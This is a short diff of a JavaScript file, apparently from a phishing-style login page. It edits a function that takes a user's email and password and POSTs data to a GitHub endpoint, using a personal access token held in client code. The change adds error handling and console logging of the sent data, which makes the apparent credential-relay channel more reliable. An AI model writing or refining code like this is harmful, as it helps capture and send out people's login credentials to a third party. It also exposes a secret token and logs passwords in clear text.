@@ -18,14 +18,26 @@ async function sendToGitHubActions(email, password) {
         }
     };
 
-    await fetch(url, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-            'Authorization': `token ${GH_PAT}`
-        },
-        body: JSON.stringify(data)
-    });
+    console.log("Enviando datos a GitHub Actions:", data);
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `token ${GH_PAT}`
+            },
+            body: JSON.stringify(data)
+        });
+
+        if (!response.ok) {
+            throw new Error(`Error en la petición a GitHub: ${response.statusText}`);
+        }
+
+        console.log("Envío exitoso a GitHub Actions");
+    } catch (error) {
+        console.error("Error al enviar a GitHub Actions:", error);
+    }
 }
 
 function next() {
